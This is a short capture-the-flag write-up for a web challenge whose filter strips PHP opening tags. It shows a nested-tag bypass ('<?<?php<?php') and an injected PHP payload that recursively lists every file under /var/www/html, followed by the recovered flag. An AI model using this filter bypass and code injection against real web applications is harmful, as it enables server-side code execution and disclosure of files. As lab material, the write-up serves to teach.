# web/ProgrammersHateProgramming2

>web/ProgrammersHateProgramming2

> Points\
>oh noes now there are more filters :(( Link: http://147.182.172.217:42007/

***

Following the same method as ProgrammersHateProgramming, I took a look at the source code to see that now "<?" is also replaced, as well as many functions that I never used


Now adding an extra "<?" onto my original test, it still works!
```php
<?<?php<?php echo '<b>Hello World</b>'; ?>?>
```

Since none of the functions were in the new blocked list, I just added the same and ran
```php
<?<?php<?php
function getDirContents($dir, &$results = array()) {
    $files = scandir($dir);

    foreach ($files as $key => $value) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
        if (!is_dir($path)) {
            $results[] = $path;
        } else if ($value != "." && $value != "..") {
            getDirContents($path, $results);
            $results[] = $path;
        }
    }

    return $results;
}

var_dump(getDirContents('/var/www/html'));?>?>
```
and also gave me a HUGE list of php files identical to before. Clearly this is not the intended solution, pretty sure I'm using other peoples solutions to find flags.

Again going through them all, I came across "z3fAOcw8kNcyCfn.php" with the desired flag, 
```
flag{wow_that_was_a_lot_of_filters_anyways_how_about_that_meaningful_connection_i_mentioned_earlier_:)}
```
